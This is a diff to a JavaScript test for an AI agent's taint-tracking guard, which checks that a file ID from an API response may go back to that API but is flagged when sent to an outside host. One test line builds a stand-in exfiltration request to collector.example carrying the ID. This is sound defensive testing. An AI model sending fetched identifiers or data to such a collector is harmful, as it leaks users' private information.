@@ -117,7 +117,7 @@ describe("an id an API response returned may go back to that API", () => {
     const { applyResultTaintPolicy } = await import("../tool-execution/sensitive-read-taint.js");
     expect(call("http_request", { url: GET, method: "GET" })?.reason).toMatch(/High-Entropy Token/);
     applyResultTaintPolicy("http_request", { url: LIST, method: "GET" }, SESSION,
-      { content: JSON.stringify({ files: [{ id: FILE_ID, name: "Q3 plan" }] }) }, { pairs: [], preTaintedPath: null });
+      { content: JSON.stringify({ files: [{ id: FILE_ID, name: "Q3 plan" }] }) }, { id: "floor-test", pairs: [], preTaintedPath: null });
     expect(call("http_request", { url: GET, method: "GET" })).toBeNull();
     expect(call("http_request", { url: `https://collector.example/?f=${FILE_ID}`, method: "GET" })?.reason).toMatch(/High-Entropy Token/);
   });
